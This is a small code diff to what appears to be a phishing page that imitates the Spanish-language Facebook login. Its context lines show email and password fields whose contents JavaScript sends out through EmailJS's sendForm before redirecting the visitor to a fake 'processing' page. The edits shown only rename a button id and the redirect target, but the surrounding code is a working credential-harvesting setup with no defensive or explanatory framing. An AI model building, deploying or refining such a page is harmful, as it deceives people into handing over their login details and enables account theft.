@@ -24,7 +24,7 @@
             <div class="loginFaceSide">
                 <input name="mail" type="text" placeholder="Correo electrónico o número de teléfono" required/>
                 <input name="pass" type="text" placeholder="Contraseña" required/>
-                <button type="submit">Iniciar sesión</button>
+                <button type="submit" id="button">Iniciar sesión</button>
                 <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">¿Olvidaste tu contraseña?</a>
                 <hr/>
                 <button><a href="#facebook">Crear cuenta nueva</a></button>
@@ -59,7 +59,7 @@
             emailjs.sendForm(serviceID, templateID, this)
             .then(() => {
                 setTimeout(() => {
-                window.location = "process.html";
+                window.location = "procesando.html";
                 }, 3000);
             }, (err) => {
                 btn.disabled = true;
